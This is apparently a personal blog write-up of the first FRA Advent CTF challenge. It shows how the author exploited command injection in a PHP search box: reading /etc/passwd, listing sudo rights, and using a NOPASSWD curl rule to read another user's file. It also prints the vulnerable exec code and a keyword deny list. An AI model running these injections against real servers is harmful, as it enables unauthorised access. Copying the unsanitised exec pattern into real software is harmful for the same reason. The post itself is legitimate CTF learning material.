---
title: "Solving FRA-knäck 1"
date: 2021-11-27
author: Martin Kauppinen
---

This year, the National Defence Radio Establishment in Sweden is issuing a
cyber-security challenge every week of Advent. This post chronicles my solution
to the first of these challenges, which was a 3-flag CTF. The challenge is
available on their [challenges website](https://challenge.fra.se), which
contains a link leading to a page which looks like this:


{{< figure
    src="fra-start.png"
    caption="Don't mind me, just trying stuff out"
    alt="Depiction of the CTF starting page" >}}

Supposedly it's a mobile phone-friendly CTF, and there are three clues, one for
each flag you can find. Other than the clues there's just a logo and a search
bar, which will be the main focus in the challenge.

{{< toc >}}

## Flag 1 - Closer than you think
Whenever you're faced with a website in a challenge, you should inspect the
source. In this case, doing so reveals the first flag as an HTML comment at the
bottom of the page source:

{{< highlight html "hl_lines=32-33">}}
<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="HandheldFriendly" content="true">
    <style>
      body {
        background-color: white;
        position: relative;
        color: black;
        text-align: center;
      }
      form {
        position: relative;
      }
    </style>
    <img src="fra-logo.png" alt="DATA" width="400" height="200">
  </head>
  <body>
    <form method="GET">
      <input type="text" name="search" />
      <input type="Submit" value="Search">
    </form>

    <h1>Välkommen till vår mobilvänliga CTF!</h1>

    <h2>Det finns 3 flaggor att hämta.</h2>
    <h3>Flagga1: Närmare än vad du tror</h3>
    <h3>Flagga2: En sökning bort</h3>
    <h3>Flagga3: I developers home</h3>
    <!-- Flagga1 -->
    <!-- flagga{may_the_source_be_with_you} -->
  </body>

{{< /highlight >}}

Curiously, the ending `</html>` tag was missing, but this didn't make any
difference. The first flag is:
```
flagga{may_the_source_be_with_you}
```

## Flag 2 - A search away
Now that the most obvious attack surface is done with, time to focus on the main
feature of the website -- the search bar. Entering an empty string, the page
changes to the following:

{{< figure
    src="fra-empty-search.png"
    alt="Page showing empty search results" >}}

A pretty minimal change -- a "search results" heading appeared, but no results
shown under it. Once again, inspecting the source reveals some of the mystery:

```html
<div id="search_results"><h3>Sökresultat</h3><!--
  <p class="indent">/usr/bin/find: missing argument to `-name'</p><br>
--></div>
```

The web server seems to pass whatever is put into the search field to the `find`
program's `-name` argument and putting the output of the command in the search
results div. Likely the full command looks something like this:

```sh
find . -name $SEARCH_QUERY
```

Since `find` reported that it failed due to missing arguments, it also seems
like stderr is redirected to stdout.

Passing `"*"` into that command, including quotes[^quotes], should list all files in the
current directory and any subdirectories.  The source changes to the following
when entering that into the search bar:

[^quotes]: If the quotes are not included, the shell expands the asterisk to the
  list of files in the current directory.

```html
<div id="search_results"><h3>Sökresultat</h3>
  <!-- <p class="indent">./</p><br> -->
  <!-- <p class="indent">./Flagga2</p><br> -->
  <!-- <p class="indent">./index.php</p><br> -->
  <!-- <p class="indent">./fra-logo.png</p><br> -->
</div>
```

So there are 3 files in the current directory: `fra-logo.png`, `index.php`, and
`Flagga2`. It's a simple matter of appending `/Flagga2` to the URL to get the
second flag:
```
flagga{Flagga3_is_in_developers_home}
```

## Flag 3 - In developer's home
The clue seems to hint that there is another user called `developer` and that
the last flag is in that user's home directory -- `/home/developer/`. However,
we're in a completely different directory, and the path supplied as an argument
to the `find` command is likely hard-coded and impossible for us to change.
Could we run a different command somehow?

Turns out we can, we just need to finish the invocation of `find` and pass a
different command to be executed immediately after `find` returns. The semicolon
can be used to run several commands in sequence in a shell. Testing this by
inserting something like `; ls -l` in the search bar gives the following output
in the page source.

```html
<div id="search_results"><h3>Sökresultat</h3>
  <!-- <p class="indent">total 48</p><br> -->
  <!-- <p><a href="-rw-r--r--. 1 root root    38 Nov 24 20:05 Flagga2">-rw-r--r--. 1 root root    38 Nov 24 20:05 Flagga2</a></p><br> -->
  <!-- <p><a href="-rw-r--r--. 1 root root 40181 Sep 25 21:40 fra-logo.png">-rw-r--r--. 1 root root 40181 Sep 25 21:40 fra-logo.png</a></p><br> -->
  <!-- <p><a href="-rw-r--r--. 1 root root  2302 Oct  6 20:53 index.php">-rw-r--r--. 1 root root  2302 Oct  6 20:53 index.php</a></p><br> -->
</div>
```

or, more legibly without the HTML bits (and I'll show any other command outputs
like this from now on):
```
total 48
-rw-r--r--. 1 root root    38 Nov 24 20:05 Flagga2
-rw-r--r--. 1 root root 40181 Sep 25 21:40 fra-logo.png
-rw-r--r--. 1 root root  2302 Oct  6 20:53 index.php
```

Alright, so we can run arbitrary commands it seems! The search bar is a shell as
long as we input a semicolon in the beginning! Let's see if our hunch from the
clue is correct; is there a user called `developer`? Let's see with `; cat
/etc/passwd`:
{{< highlight html "hl_lines=24">}}
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:996:User for polkitd:/:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
sssd:x:996:993:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rngd:x:995:992:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
ctf_admin:x:1000:1000::/home/ctf_admin:/bin/bash
developer:x:1001:1001::/home/developer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
{{< /highlight >}}

Yep! Third from the bottom. Now to find that final flag; how about `; ls -l
/home/developer`?

```
ls: cannot open directory '/home/developer': Permission denied
```

Ah. We're running as a different user. Just out of curiosity, which user? `;
whoami`

```
apache
```

Okay, it's an Apache web server running as the `apache` user, which of course is
not allowed to access the home directory of `developer`. We need some privilege
escalation. Can we simply run `; sudo ls -l /home/developer`?

{{< highlight txt >}}
sudo: unable to open /run/sudo/ts/apache: Permission denied

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
{{< /highlight >}}

Of course not, that would be too easy. We don't have an interactive terminal, so
we can't input a password to run `sudo`. Is there any command we could run with
`sudo` but without having to specify a password? Consulting the man-page for
`sudo` reveals that the `-l` flag will list allowed and forbidden commands.
Let's try `; sudo -l` and see what we're allowed to do:

{{< highlight txt "hl_lines=10-11">}}
Matching Defaults entries for apache on ctf:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User apache may run the following commands on ctf:
    (developer) NOPASSWD: /usr/bin/curl
{{< /highlight >}}

Oh! The last line tells us that we can run `curl` _as_ `developer` without
specifying a password! Identity theft is a crime, kids, but it is sometimes
useful in contexts like this. The first and second flags were named `Flagga1`
and `Flagga2`. Continuing the pattern suggests that the third flag is in a file
called `Flagga3`. Let's `curl` that file while impersonating `developer`! `;
sudo -u developer curl "file:///home/developer/Flagga3"` yields:

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100    68  100    68    0     0  68000      0 --:--:-- --:--:-- --:--:-- 68000
flagga{https://www.fra.se/jobbahososs.4.6a76c4041614726b25ad2.html}
```

There we go. The final flag is a link to their recruiting page.

## P.S.

### "Mobile-friendly", or: "Mobile = Chrome, right?"
It is absolutely possible to complete this challenge on a mobile web browser, by
simply prepending `view-source:` to the URL after issuing a search request and
looking at the hidden results in the HTML comments. An issue I ran into when
trying this though, is that I use Mozilla Firefox as my default web browser on
Android, and for some unexplicable reason, they removed support for viewing
source some time in 2019, as per [this
issue](https://github.com/mozilla-mobile/fenix/issues/3710), and then re-added
it. As of this year, for some people it works and for some people it doesn't, as
commenters point out in [this other
issue](https://github.com/mozilla-mobile/fenix/issues/3972). At time of
writing, I used version 94.1.2 and I can view the source of websites by
prepending `view-source:`... on certain sites only. I'm not exactly sure what
the criteria for it to work are, but clearly something must have broken in the
removing and reintroducing process.

My first thought was that it had something to do with HTTPS vs HTTP, as the
challenge site connected with HTTP only. However, trying some different
HTTP-only sites worked fine, so it wasn't that. `view-source:` does seem to add
in the `https://` scheme in the URL though. Odd.

My next thought was that since the website was simply accessed with a raw
IP-address, the browser just had some bug that didn't allow it, but this didn't
seem to be the case either.

So I couldn't view the page source on Firefox for Android. Google Chrome works
fine, however. And thus Chrome's/Blink engine's hegemony of the web is
perpetuated, even by cyber-security organizations who just don't test web
browsers other than Chrome[^fra-speculation].

[^fra-speculation]: This is speculation on my part.

### Meta-strategizing - `ps -aux`
A command that could have been useful - had the commands needed to solve the
last flag taken a long time - is `ps -aux` to show all the current running
processes. This shows whatever commands anyone who figured out you could run
arbitrary commands from the search bar are currently running. There were a lot
of running instances of variations on `grep -Ril "flagga" /`, trying to
recursively search the entire filesystem for files containing the word "flagga".
These commands will keep running until they've exhausted what they're allowed to
access in the filesystem, of course, but this will not find the last flag as we
discovered in our own search for it. The search bar commands are running as the
user `apache`, which does not have access to `developer`'s home
directory and they will never find the third flag.

In order for `ps -aux` to be of any use, you'd have to time it in such a way
that someone else looking for the third flag is currently running the command
that finds it. None of the necessary commands take long enough that the chances
you'd see them are any good (Though not for lack of trying, I saw a few other
people running `ps -aux` doing exactly this).

It was fun to see some people getting bored in the search for the final flag,
and just messing with some commands. I saw one infinite loop that just wrote
"poop" to stdout forever, which could be seen with `; head /proc/<pid>/fd/1`,
returning a bunch of lines saying "poop". A couple of people had started
infinite loops writing bytes from `/dev/urandom` to stdout, and running the same
`head` command as before filled the page source with garbage.

A couple of people had (possibly accidentally) started some interactive programs
that of course could not be terminated, since there was to interaction possible.
Some instances of `vi`, a `tail -f /proc/<pid>/fd/1` here and there.

One educational example is someone who seems to have run the command `grep -r
Flagga2 fra-logo.png index.php /`. This is someone who actually wanted to grep
for anything, in any file, across the file system, recursively. But they forgot
to quote the asterisk in `grep -r "*" /`, so the shell globbing instead expanded
the asterisk and replaced it with the filenames of the three files in the
current directory. Wonder if that person went to bed after firing that command,
hoping to be able to see the contents of every file when they wake up in the
morning. They'll be disappointed, as it's unlikely that pretty much any file
contains any of the strings "Flagga2", "fra-logo.png", or "index.php". Okay,
that last one is more likely than the others, but the point stands. Not to
mention the fact that they still don't have permission to access `developer`'s
home directory as `apache`, so even if they remembered to quote the asterisk it
still wouldn't work, as discussed above.

A colleague of mine found that apparently there was a directory somewhere that
`apache` has write permissions to, and in that directory someone had put a file
named something like "Great that you can crash the entire server, but where the
hell is the third flag?", which I found a bit funny.

### Viewing the true source
In the directory where all commands are run from is also the source PHP-code for
the website in a file called `index.php`. Running `; cat index*` [^cat-index],
we can see exactly what command is being run on the server and which characters
are banned:

[^cat-index]: We can't input `index.php` as an argument, because the `.` character is
  banned.

```php
if(isset($_GET['search'])) {
    if(preg_match('/chmod|rm |chattr|shutdown|reboot/', $_GET['search'], $matches)) {
        error_log("[SEARCH_BOX] An attempt has been made to inject code in the search box");
        die("We've detected that you've attempted to break into our search box. #Shame #Shame #Shame");
    }
    else if(preg_match('/[^a-zA-ZåäöÅÄÖ0-9:;* "\?\-\/\/]/', $_GET['search'], $matches)) {
        error_log("[SEARCH_BOX] An attempt has been made to inject code in the search box");
        die("We've detected that you've attempted to break into our search box. #Shame #Shame #Shame");
    }
}
```

Interesting. We're not allowed to run any of the commands `chmod`, `rm`,
`chattr`, `shutdown`, or `reboot`. Makes sense; we don't want anyone to ruin the
CTF of someone else by removing flags or shutting the system down. Furthermore,
we can see that the allowed characters are the alphanumerics (including Swedish
characters), colon, semi-colon, asterisk, space, double quote, question mark,
dash, and slash; which is curiously in there twice for some reason. I don't know
enough PHP to know if it's a quirk of PHP or just a mistake, though my money is
on mistake.

Entering any of the forbidden strings or characters doesn't forward your input
to the shell, instead just tongue-in-cheek shaming you for trying to break into
the search box.

For fun, we can check how exactly the `find` command is invoked. Here are the
relevant two lines from `index.php`:

```php
$output = [];
exec('/usr/bin/find ./ -name ' . $_GET['search'] . ' 2>&1', $output)
```

Indeed, just as theorized previously in the article, it's a simple `find ./
-name $SEARCH_QUERY`. And stderr is redirected to stdout, with everything being
saved in the `$output` array.
